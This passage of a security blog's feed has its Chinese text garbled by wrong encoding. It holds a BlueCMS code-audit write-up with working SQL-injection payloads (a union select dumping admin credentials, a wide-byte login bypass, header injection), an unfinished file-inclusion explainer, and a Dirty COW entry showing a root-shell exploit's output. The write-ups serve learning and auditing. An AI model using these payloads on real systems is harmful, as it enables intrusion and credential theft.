    <content type="html"><![CDATA[<h1 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h1><p>å¾ˆä¹…æ²¡æœ‰ä»£ç å®¡è®¡äº†ï¼Œæ‹¿ä¸€å¥—ç®€å•çš„æ‰¾æ‰¾æ„Ÿè§‰ã€‚bluecmsæ˜¯ä¸€å¥—æ¯”è¾ƒè€çš„é—¨æˆ·ç½‘ç«™cmsï¼Œç½‘ä¸Šä¹Ÿæœ‰å¾ˆå¤šå…³äºå®ƒçš„æ¼æ´è¿˜æœªä¿®è¡¥ï¼Œæ‰€ä»¥ä¸‹æ–‡çš„æ¼æ´ä¹Ÿä¸ç®—æ˜¯æœ€æ–°çš„ï¼Œä»…å½“æ˜¯ç»ƒç»ƒæ‰‹ã€‚</p><a id="more"></a><h1 id="SQLæ³¨å…¥åˆ†æ"><a href="#SQLæ³¨å…¥åˆ†æ" class="headerlink" title="SQLæ³¨å…¥åˆ†æ"></a>SQLæ³¨å…¥åˆ†æ</h1><p>é¦–å…ˆå…³æ³¨ä¸€ä¸‹æ•°æ®çš„è¾“å…¥</p><h2 id="å…¨å±€æ•°æ®è½¬ä¹‰"><a href="#å…¨å±€æ•°æ®è½¬ä¹‰" class="headerlink" title="å…¨å±€æ•°æ®è½¬ä¹‰"></a>å…¨å±€æ•°æ®è½¬ä¹‰</h2><p>åœ¨common.inc.phpä¸­</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if(!get_magic_quotes_gpc())</span><br><span class="line">&#123;</span><br><span class="line">$_POST = deep_addslashes($_POST);</span><br><span class="line">$_GET = deep_addslashes($_GET);</span><br><span class="line">$_COOKIES = deep_addslashes($_COOKIES);</span><br><span class="line">$_REQUEST = deep_addslashes($_REQUEST);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†è·Ÿè¿›ä¸€ä¸‹deep_addslashes</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function deep_addslashes($str)</span><br><span class="line">&#123;</span><br><span class="line">if(is_array($str))</span><br><span class="line">&#123;</span><br><span class="line">foreach($str as $key=&gt;$val)</span><br><span class="line">&#123;</span><br><span class="line">$str[$key] = deep_addslashes($val);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">$str = addslashes($str);</span><br><span class="line">&#125;</span><br><span class="line">return $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°å¯¹æ•°æ®çš„æ³¨å…¥ï¼Œè¿›è¡Œäº†åŠ æ–œæ è½¬ä¹‰çš„æ“ä½œã€‚é‚£ä¹ˆæ¥ä¸‹æ¥æ‰¾æ³¨å…¥æ€è·¯ä¸»è¦æœ‰ä»¥ä¸‹3ç‚¹ï¼š</p><ol><li>æ‰¾æ•´æ•°å‹æ³¨å…¥</li><li>æ•´å¥—cmsé»˜è®¤gb2312ç¼–ç ï¼Œå®¹æ˜“é€ æˆå®½å­—èŠ‚æ³¨å…¥</li><li>httpå¤´å¹¶ä¸åœ¨è½¬ä¹‰çš„èŒƒå›´å†…ï¼Œæ‰€ä»¥ç±»ä¼¼å­˜å…¥ipï¼Œrefferçš„ä½ç½®ä¹Ÿèƒ½å‘ç”Ÿæ³¨å…¥</li></ol><h2 id="æ•´æ•°å‹æ³¨å…¥"><a href="#æ•´æ•°å‹æ³¨å…¥" class="headerlink" title="æ•´æ•°å‹æ³¨å…¥"></a>æ•´æ•°å‹æ³¨å…¥</h2><p>æ‹¿grepåŒ¹é…äº†ä¸€ä¸‹$_GETï¼Œæ‰¾åˆ°ä¸€å¤„ä¸åšå…¶ä»–è¿‡æ»¤çš„æ•´æ•°å‹ä½ç½®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ad_js.php:$ad_id = !empty($_GET[&apos;ad_id&apos;]) ? trim($_GET[&apos;ad_id&apos;]) : &apos;&apos;;</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›ad_js.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ad_id = !empty($_GET[&apos;ad_id&apos;]) ? trim($_GET[&apos;ad_id&apos;]) : &apos;&apos;;</span><br><span class="line">if(empty($ad_id))</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;Error!&apos;;</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ad = $db-&gt;getone(&quot;SELECT * FROM &quot;.table(&apos;ad&apos;).&quot; WHERE ad_id =&quot;.$ad_id);</span><br></pre></td></tr></table></figure><p>getoneå‡½æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function getone($sql, $type=MYSQL_ASSOC)&#123;</span><br><span class="line">    $query = $this-&gt;query($sql,$this-&gt;linkid);</span><br><span class="line">    $row = mysql_fetch_array($query, $type);</span><br><span class="line">    return $row;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå¯¹ad_idæ²¡æœ‰åšå…¶ä»–è¿‡æ»¤å¤„ç†ï¼Œé€ æˆäº†æ•´æ•°å‹æ³¨å…¥,ç”±äºåé¢ä¼šå°†ad_contentæ‰“å°åœ¨é¡µé¢ä¸Šï¼Œæ‰€ä»¥ç›´æ¥ç”¨unionæ³¨å…¥å°±å¯ä»¥è·å¾—æ•°æ®ï¼Œæ„é€ payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ad_js.php?ad_id=1%20union%20select%201,2,3,4,5,6,concat(admin_name,0x23,pwd)%20from%20blue_admin%20limit%201</span><br></pre></td></tr></table></figure><p>ç»“æœå¯ä»¥åœ¨è¿”å›çš„ç•Œé¢ä¸­çœ‹åˆ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">document.write(&quot;admin#21232f297a57a5a743894a0e4a801fc3&quot;);</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>ps:å› ä¸ºè¯¥cmsé”™è¯¯å›æ˜¾å…·ä½“sqlè¯­å¥ï¼Œè¡¨å‰ç¼€å¯ä»¥é€šè¿‡æŠ¥é”™çš„æ–¹æ³•æŠŠè¡¨å‰ç¼€çˆ†å‡ºæ¥ã€‚</p><h2 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h2><p>bluecmsæ“ä½œæ•°æ®åº“çš„å…·ä½“ç±»å®šä¹‰åœ¨mysql.class.php,é»˜è®¤è¿æ¥æ—¶çš„ç¼–ç ä¸ºgbkï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“å½“æ•°æ®åº“è¿æ¥æ—¶çš„ç¼–ç ä¸ºgbkç­‰åŒå­—èŠ‚ç¼–ç æ—¶ï¼Œå®¹æ˜“å‘ç”Ÿå®½å­—èŠ‚æ³¨å…¥ã€‚å‰é¢æåˆ°è¯¥å¥—cmså¯¹æ•°æ®è¾“å…¥è¿›è¡Œäº†è½¬ä¹‰çš„æ“ä½œï¼Œé‚£ä¹ˆåˆšåˆšå¥½æ¡ä»¶éƒ½é½äº†ï¼Œå¿…ç„¶å­˜åœ¨å®½å­—èŠ‚æ³¨å…¥ã€‚grepçœ‹äº†ä¸€ä¸‹ï¼ŒåŸºæœ¬ä¸Šçš„å­—ç¬¦ä¸²éƒ½åªæ˜¯åšäº†è½¬ä¹‰å¤„ç†ï¼Œæ‰€ä»¥å­—ç¬¦ä¸²æ•°æ®è¾“å…¥ç‚¹éƒ½å­˜åœ¨å®½å­—èŠ‚æ³¨å…¥ã€‚å¤§å¤šæ•°æ³¨å…¥éƒ½æ˜¯ç›²æ³¨ï¼Œæ²¡æ‰¾åˆ°å…·ä½“å¯ä»¥ä¼šæ˜¾æ•°æ®çš„åœ°æ–¹ï¼Œè¿™é‡Œå°±ç®€å•çœ‹ä¸€ä¸‹ç™»é™†å¤„</p><h3 id="åå°ç™»å½•å¤„"><a href="#åå°ç™»å½•å¤„" class="headerlink" title="åå°ç™»å½•å¤„"></a>åå°ç™»å½•å¤„</h3><p>å…¶å®å‰å°user.phpï¼Œä¹Ÿå­˜åœ¨æ³¨å…¥ï¼Œåªæ˜¯ç›²æ³¨ï¼Œè¿™é‡Œå°±å–ç®€å•çš„åå°ç™»å½•éªŒè¯å¤„<br>admin/login.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">elseif($act == &apos;do_login&apos;)&#123;</span><br><span class="line"> $admin_name = isset($_POST[&apos;admin_name&apos;]) ? trim($_POST[&apos;admin_name&apos;]) : &apos;&apos;;</span><br><span class="line"> $admin_pwd = isset($_POST[&apos;admin_pwd&apos;]) ? trim($_POST[&apos;admin_pwd&apos;]) : &apos;&apos;;</span><br><span class="line"> $remember = isset($_POST) ? intval($_POST[&apos;rememberme&apos;]) : 0;</span><br><span class="line"> if($admin_name == &apos;&apos;)&#123;</span><br><span class="line"> showmsg(&apos;xxx&apos;);</span><br><span class="line"> &#125;</span><br><span class="line"> if($admin_pwd == &apos;&apos;)&#123;</span><br><span class="line"> showmsg(&apos;xxx&apos;);</span><br><span class="line"> &#125;</span><br><span class="line"> if(check_admin($admin_name, $admin_pwd))&#123;</span><br><span class="line"> update_admin_info($admin_name);</span><br><span class="line"> if($remember == 1)&#123;</span><br><span class="line"> setcookie(&apos;Blue[admin_id]&apos;, $_SESSION[&apos;admin_id&apos;], time()+86400);</span><br><span class="line"> setcookie(&apos;Blue[admin_name]&apos;, $admin_name, time()+86400);</span><br><span class="line">setcookie(&apos;Blue[admin_pwd]&apos;, md5(md5($admin_pwd).$_CFG[&apos;cookie_hash&apos;]), time()+86400);</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;else&#123;</span><br><span class="line"> showmsg(&apos;xxx&apos;);</span><br><span class="line"> &#125;</span><br><span class="line"> showmsg(&apos;xxx&apos;, &apos;index.php&apos;);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>ç»§ç»­è·Ÿè¿›check_admin</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function check_admin($name, $pwd)</span><br><span class="line">&#123;</span><br><span class="line">global $db;</span><br><span class="line">$row = $db-&gt;getone(&quot;SELECT COUNT(*) AS num FROM &quot;.table(&apos;admin&apos;).&quot; WHERE admin_name=&apos;$name&apos; and pwd = md5(&apos;$pwd&apos;)&quot;);</span><br><span class="line"> if($row[&apos;num&apos;] &gt; 0)</span><br><span class="line"> &#123;</span><br><span class="line"> return true;</span><br><span class="line"> &#125;</span><br><span class="line"> else</span><br><span class="line"> &#123;</span><br><span class="line"> return false;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå‘ç”Ÿäº†ä¸€æ¬¡ç™»é™†éªŒè¯ï¼Œå¯ä»¥é€šè¿‡å®½å­—èŠ‚æ³¨å…¥æ¥åšä¸‡èƒ½å¯†ç ç™»é™†ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user_name=admin%65%27+or+1%3D1%23&amp;pwd=123</span><br></pre></td></tr></table></figure><p><img src="../../../../img/bluecms_code_review/bluecms_login_success.png" alt=""></p><h2 id="å­˜å…¥ipé€ æˆæ³¨å…¥"><a href="#å­˜å…¥ipé€ æˆæ³¨å…¥" class="headerlink" title="å­˜å…¥ipé€ æˆæ³¨å…¥"></a>å­˜å…¥ipé€ æˆæ³¨å…¥</h2><p>åœ¨common.inc.phpä¸­å¯ä»¥æ‰¾åˆ°getip()å‡½æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">function getip()</span><br><span class="line">&#123;</span><br><span class="line">if (getenv(&apos;HTTP_CLIENT_IP&apos;))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(&apos;HTTP_CLIENT_IP&apos;); </span><br><span class="line">&#125;</span><br><span class="line">elseif (getenv(&apos;HTTP_X_FORWARDED_FOR&apos;)) </span><br><span class="line">&#123; </span><br><span class="line">$ip = getenv(&apos;HTTP_X_FORWARDED_FOR&apos;);</span><br><span class="line">&#125;</span><br><span class="line">elseif (getenv(&apos;HTTP_X_FORWARDED&apos;)) </span><br><span class="line">&#123; </span><br><span class="line">$ip = getenv(&apos;HTTP_X_FORWARDED&apos;);</span><br><span class="line">&#125;</span><br><span class="line">elseif (getenv(&apos;HTTP_FORWARDED_FOR&apos;))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(&apos;HTTP_FORWARDED_FOR&apos;); </span><br><span class="line">&#125;</span><br><span class="line">elseif (getenv(&apos;HTTP_FORWARDED&apos;))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(&apos;HTTP_FORWARDED&apos;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123; </span><br><span class="line">$ip = $_SERVER[&apos;REMOTE_ADDR&apos;];</span><br><span class="line">&#125;</span><br><span class="line">return $ip;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†çœ‹çœ‹è°ƒç”¨ä»–çš„ä½ç½®<br><img src="../../../../img/bluecms_code_review/bluecms_getip.png" alt=""></p><p>online_ipè°ƒç”¨å¤„<br><img src="../../../../img/bluecms_code_review/bluecms_online_ip.png" alt=""></p><p>çœ‹çœ‹guest_book.phpå¤„å­˜åœ¨insertæ³¨å…¥ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡è¦†ç›–åé¢çš„contentï¼Œé€ æˆæ•°æ®å›æ˜¾ã€‚é€šè¿‡xffä¼ å…¥æ³¨å…¥è¯­å¥æˆ–è€…client ipä¼ å…¥ã€‚</p><p><img src="../../../../img/bluecms_code_review/bluecms_ip_injection.png" alt=""><br>ç»“æœå¯ä»¥çœ‹åˆ°<br><img src="../../../../img/bluecms_code_review/bluecms_ip_results.png" alt=""></p><p>å…¶ä»–ä½ç½®çš„æ³¨å…¥ï¼Œä¸èƒ½å›æ˜¾ï¼Œå°±ä¸åˆ†æäº†ã€‚</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æ€»ä½“æ¥è¯´ï¼Œç›´æ¥å¯ä»¥grepåˆ°<code>$_GET</code>ã€<code>$_POST</code>ã€<code>$_REQUEST</code>çš„cmsï¼Œå®¡è®¡èµ·æ¥ä¼šæ¯”è¾ƒè½»æ¾ã€‚å¯ä»¥å…ˆä»å…¥å£çœ‹èµ·ï¼Œå°†common,configç­‰æ–‡ä»¶çœ‹ä¸€éï¼Œå†æŸ¥æ‰¾å±é™©å‡½æ•°ï¼Œæ•°æ®å…¥å£å°±å¯å®¡è®¡å‡ºå‡ ä¸ªæ¼æ´æ¥ã€‚bluecmsæš‚æ—¶å®¡è®¡åˆ°è¿™ä¸€æ­¥ï¼Œä¸»è¦æ‰¾çš„æ˜¯SQLæ³¨å…¥çš„æ¼æ´ã€‚å…¶ä»–æ¼æ´æ‰“ç®—å‡†å¤‡å¦å¤–ä¸€å¥—cmsæ¥å®¡è®¡:)</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;æ¦‚è¿°&quot;&gt;&lt;a href=&quot;#æ¦‚è¿°&quot; class=&quot;headerlink&quot; title=&quot;æ¦‚è¿°&quot;&gt;&lt;/a&gt;æ¦‚è¿°&lt;/h1&gt;&lt;p&gt;å¾ˆä¹…æ²¡æœ‰ä»£ç å®¡è®¡äº†ï¼Œæ‹¿ä¸€å¥—ç®€å•çš„æ‰¾æ‰¾æ„Ÿè§‰ã€‚bluecmsæ˜¯ä¸€å¥—æ¯”è¾ƒè€çš„é—¨æˆ·ç½‘ç«™cmsï¼Œç½‘ä¸Šä¹Ÿæœ‰å¾ˆå¤šå…³äºå®ƒçš„æ¼æ´è¿˜æœªä¿®è¡¥ï¼Œæ‰€ä»¥ä¸‹æ–‡çš„æ¼æ´ä¹Ÿä¸ç®—æ˜¯æœ€æ–°çš„ï¼Œä»…å½“æ˜¯ç»ƒç»ƒæ‰‹ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="codereview" scheme="http://blog.0kami.cn/categories/codereview/"/>
    
    
      <category term="cms" scheme="http://blog.0kami.cn/tags/cms/"/>
    
  </entry>
  
  <entry>
    <title>ã€VULNERABLITYã€‘æ–‡ä»¶åŒ…å«æ¼æ´è¯¦è§£</title>
    <link href="http://blog.0kami.cn/2016/12/19/old-file-include/"/>
    <id>http://blog.0kami.cn/2016/12/19/old-file-include/</id>
    <published>2016-12-19T05:44:33.000Z</published>
    <updated>2018-01-25T07:20:01.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h1><p>å¾ˆä¹…æ²¡æœ‰å½’çº³æ€»ç»“çŸ¥è¯†ç‚¹äº†ï¼Œå­¦äº†é‚£ä¹ˆå¤šæ€»æ„Ÿè§‰é‚£ä¹ˆé›¶æ•£ï¼Œæ‰€ä»¥å‡†å¤‡å¼€å§‹æ€»ç»“è¿™ä¸€ç³»åˆ—çš„æ¼æ´è¯¦è§£ã€‚ä¸€æ–¹é¢æ˜¯æ€»ç»“ä¸€æ–¹é¢ä¹Ÿæ˜¯å¤ä¹ ã€‚è¿™ç¯‡ä¸»è¦æ€»ç»“ä¸€ä¸‹æ–‡ä»¶åŒ…å«æ¼æ´ã€‚<br><a id="more"></a></p><h1 id="æ–‡ä»¶åŒ…å«æ¼æ´"><a href="#æ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="æ–‡ä»¶åŒ…å«æ¼æ´"></a>æ–‡ä»¶åŒ…å«æ¼æ´</h1><p>ç”±äºåœ¨Webåº”ç”¨å¼€å‘çš„è¿‡ç¨‹ä¸­ï¼Œå¤§é‡ä»£ç æ˜¯å¯ä»¥é‡å¤ä½¿ç”¨çš„ï¼Œä¸ºäº†æ–¹ä¾¿ä½¿ç”¨ç»“åˆå¼€å‘è¯­è¨€(å¦‚php)çš„ä¾¿åˆ©ï¼ŒåŒ…å«é‡å¤åˆ©ç”¨çš„ä»£ç ï¼Œå¦‚æœåœ¨åŒ…å«è¿‡ç¨‹ä¸­ï¼Œè·¯å¾„æˆ–è¯·æ±‚çš„urlå¯æ§ä¸”æ²¡æœ‰åšä»»ä½•çš„å®‰å…¨å¤„ç†ï¼Œå°±å®¹æ˜“å‘ç”Ÿæ–‡ä»¶åŒ…å«æ¼æ´ã€‚<br>æ–‡ä»¶åŒ…å«æ¼æ´åŒ…æ‹¬</p><ul><li>æœ¬åœ°æ–‡ä»¶åŒ…å«</li><li>è¿œç¨‹æ–‡ä»¶åŒ…å«</li></ul><p>ä¸‹é¢ä¸»è¦è®²çš„æ–‡ä»¶åŒ…å«åœ¨phpä¸­çš„åº”ç”¨ï¼Œæ¯•ç«Ÿphpæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€ï¼Œ23333333<br>ps:å…¶ä»–è¯­è¨€ï¼Œé‡åˆ°äº†å†è¡¥å……</p><h1 id="è¿œç¨‹æ–‡ä»¶åŒ…å«"><a href="#è¿œç¨‹æ–‡ä»¶åŒ…å«" class="headerlink" title="è¿œç¨‹æ–‡ä»¶åŒ…å«"></a>è¿œç¨‹æ–‡ä»¶åŒ…å«</h1><p>è¿™é‡Œå…ˆè®²ä¸€ä¸‹è¿œç¨‹æ–‡ä»¶åŒ…å«RFIï¼ˆRemote File Includeï¼‰ï¼Œé¡¾åæ€ä¹‰ï¼Œè¿œç¨‹æ–‡ä»¶åŒ…å«å°±æ˜¯ï¼ŒWebåº”ç”¨ç¨‹åºè¯·æ±‚è¿œç¨‹çš„èµ„æºï¼Œè¿›è¡Œä¸€ä¸ªåŒ…å«åˆ©ç”¨ã€‚ä¸€äº›çŒ¥ççš„è¿‡é©¬ä¸€å¥è¯æœ¨é©¬å°±æ˜¯åˆ©ç”¨è¿™ç§æ–¹å¼è¿›è¡Œä¸€ä¸ªæ¶æ„ä»£ç çš„åŒ…å«ã€‚<br>åœ¨phpä¸­é€ æˆè¿œç¨‹æ–‡ä»¶åŒ…å«ï¼Œé¦–å…ˆéœ€è¦é…ç½®æ–‡ä»¶ä¸­<code>allow_url_include=On</code>é»˜è®¤ä¸å¼€å¯ï¼Œä»¥åŠè¿œç¨‹è¯»å–æ–‡ä»¶<code>allow_url_fopen=On</code>ï¼Œæ»¡è¶³è¿™äº›æ¡ä»¶ï¼Œæˆ‘ä»¬å†æ¥çœ‹çœ‹æœ‰å“ªäº›è§¦å‘è¿œç¨‹æ–‡ä»¶åŒ…å«çš„phpå‡½æ•°ã€‚<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è¯»å–è¿œç¨‹æ–‡ä»¶å†…å®¹</span></span><br><span class="line">fopen()</span><br><span class="line">copy()</span><br><span class="line">file_get_content()</span><br><span class="line"><span class="comment">//åŒ…å«è¿œç¨‹æ–‡ä»¶ä»£ç </span></span><br><span class="line"><span class="keyword">include</span>()</span><br><span class="line"><span class="keyword">include_once</span>()</span><br><span class="line"><span class="keyword">require</span>()</span><br><span class="line"><span class="keyword">require_once</span>()</span><br><span class="line"><span class="comment">//å¯èƒ½ä¼šæœ‰é—æ¼ï¼Œå°ä¼™ä¼´å¦‚æœçŸ¥é“è¿˜æœ‰å…¶ä»–çš„å¯ä»¥emailæˆ‘ï¼šï¼‰</span></span><br></pre></td></tr></table></figure></p><p>å‰é¢è¯»å–è¿œç¨‹æ–‡ä»¶å†…å®¹ï¼Œå¯èƒ½ä¼šå‡ºç°åœ¨ä¸Šä¼ å¤´åƒå¤„ï¼Œå­˜å–è¿œç¨‹å¤´åƒã€‚<br>åè€…å±å®³å¯èƒ½æ›´å¤§ï¼Œç›´æ¥åŒ…å«æ¶æ„ä»£ç æ‰§è¡Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚</p><h2 id="è¿œç¨‹åŒ…å«æ”¯æŒçš„åè®®"><a href="#è¿œç¨‹åŒ…å«æ”¯æŒçš„åè®®" class="headerlink" title="è¿œç¨‹åŒ…å«æ”¯æŒçš„åè®®"></a>è¿œç¨‹åŒ…å«æ”¯æŒçš„åè®®</h2><p>åœ¨æ»¡è¶³é…ç½®æ–‡ä»¶çš„è¦æ±‚ä¸‹ï¼Œä½¿ç”¨phpæ”¯æŒä½¿ç”¨<code>http</code>ã€<code>https</code>(å­˜åœ¨opensslæ‰©å±•æ—¶)ã€<code>ftp</code>ã€<code>php://input</code>ã€</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;æ¦‚è¿°&quot;&gt;&lt;a href=&quot;#æ¦‚è¿°&quot; class=&quot;headerlink&quot; title=&quot;æ¦‚è¿°&quot;&gt;&lt;/a&gt;æ¦‚è¿°&lt;/h1&gt;&lt;p&gt;å¾ˆä¹…æ²¡æœ‰å½’çº³æ€»ç»“çŸ¥è¯†ç‚¹äº†ï¼Œå­¦äº†é‚£ä¹ˆå¤šæ€»æ„Ÿè§‰é‚£ä¹ˆé›¶æ•£ï¼Œæ‰€ä»¥å‡†å¤‡å¼€å§‹æ€»ç»“è¿™ä¸€ç³»åˆ—çš„æ¼æ´è¯¦è§£ã€‚ä¸€æ–¹é¢æ˜¯æ€»ç»“ä¸€æ–¹é¢ä¹Ÿæ˜¯å¤ä¹ ã€‚è¿™ç¯‡ä¸»è¦æ€»ç»“ä¸€ä¸‹æ–‡ä»¶åŒ…å«æ¼æ´ã€‚&lt;br&gt;
    
    </summary>
    
      <category term="notes" scheme="http://blog.0kami.cn/categories/notes/"/>
    
    
      <category term="vul" scheme="http://blog.0kami.cn/tags/vul/"/>
    
  </entry>
  
  <entry>
    <title>ã€CVE-2016-5195ã€‘Dirtycow</title>
    <link href="http://blog.0kami.cn/2016/10/26/old-dirtycow-cve-2016-5195/"/>
    <id>http://blog.0kami.cn/2016/10/26/old-dirtycow-cve-2016-5195/</id>
    <published>2016-10-26T01:35:13.000Z</published>
    <updated>2018-01-25T07:17:01.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h1><p>æœ€è¿‘å‡ºæ¥çš„dirtycowï¼Œå½±å“ç‰ˆæœ¬:Linux kernel &gt;= 2.6.22ï¼ˆ2007å¹´å‘è¡Œï¼Œåˆ°ä»Šå¹´10æœˆ18æ—¥æ‰ä¿®å¤ï¼‰,ç”¨ç½‘ä¸Šçš„EXPè¯•äº†ä¸€ä¸‹ï¼Œè®°å½•ä¸€ä¸‹è¿‡ç¨‹<br><a id="more"></a></p><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><h3 id="https-www-exploit-db-com-exploits-40616"><a href="#https-www-exploit-db-com-exploits-40616" class="headerlink" title="https://www.exploit-db.com/exploits/40616/"></a><a href="https://www.exploit-db.com/exploits/40616/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/40616/</a></h3><p>è¿™ä¸ªEXPæ˜¯exploitdbä¸Šçš„ï¼Œä½†æ˜¯å®¹æ˜“é€ æˆç³»ç»Ÿå´©æºƒï¼ŒæˆåŠŸåä¼šè¿”å›ä¸€ä¸ªrootæƒé™çš„shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">okami@ubuntu14:~$ ./dirtycow</span><br><span class="line">DirtyCow root privilege escalation</span><br><span class="line">Backing up /usr/bin/passwd.. to /tmp/bak</span><br><span class="line">Size of binary: 47032</span><br><span class="line">Racing, this may take a while..</span><br><span class="line">thread stopped</span><br><span class="line">thread stopped</span><br><span class="line">/usr/bin/passwd is overwritten</span><br><span class="line">Popping root shell.</span><br><span class="line">Don&apos;t forget to restore /tmp/bak</span><br><span class="line">root@ubuntu14:/home/okami# id</span><br><span class="line">uid=0(root) gid=1000(okami) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare),1000(okami)</span><br><span class="line">root@ubuntu14:/home/okami# whoami</span><br><span class="line">root</span><br><span class="line">root@ubuntu14:/home/okami#</span><br></pre></td></tr></table></figure><h3 id="https-github-com-scumjr-dirtycow-vdso"><a href="#https-github-com-scumjr-dirtycow-vdso" class="headerlink" title="https://github.com/scumjr/dirtycow-vdso"></a><a 